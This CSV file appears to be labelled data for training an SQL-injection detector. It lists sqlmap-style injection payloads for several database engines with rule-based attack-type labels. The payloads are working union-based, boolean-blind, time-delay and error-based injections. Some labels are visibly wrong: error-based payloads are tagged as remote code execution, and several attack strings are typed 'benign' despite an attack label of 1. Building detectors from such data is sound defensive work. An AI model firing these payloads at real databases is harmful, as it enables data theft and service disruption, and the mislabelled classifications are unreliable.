row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9630,select ( case when ( 1014 = 4280 ) then 1014 else 1014* ( select 1014 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9631,-5769 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9632,"1%"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
9633,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9634,"-5526 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9635,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""endx"" = ""endx",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
9636,1 ) ) as dhqt where 8485 = 8485 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9637,"-1059"" ) union all select 1276,1276,1276,1276,1276,1276,1276,1276#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9638,"-3377"" ) or 4982 = 6608#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9639,"-7676"" ) ) as flov where 7967 = 7967 union all select 7967--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9640,1' rlike ( select ( case when ( 1916 = 7874 ) then 1 else 0x28 end ) ) and 'ughq' = 'ughq,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
9641,"-1630' union all select 1971,1971--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9642,"1 ) as mwcs where 2544 = 2544 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9643,"-6436' in boolean mode ) union all select 7589,7589,7589,7589--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9644,1'+ ( select 'ozpm' where 6939 = 6939 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) +',1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
9645,"1"" where 3318 = 3318",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9646,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'ukxj' = 'ukxj",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
9647,"1 ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9648,"1' ) ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9649,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'fvbv' = 'fvbv",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9650,1' ) as jwch where 4609 = 4609,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9651,1 ) as afmb where 8665 = 8665 order by 1#,1,,boolean_blind,generic,0.95,8665 = 8665 or detected — boolean_blind injection (priority 8) on generic,rule-based
9652,"-7107"" ) ) ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
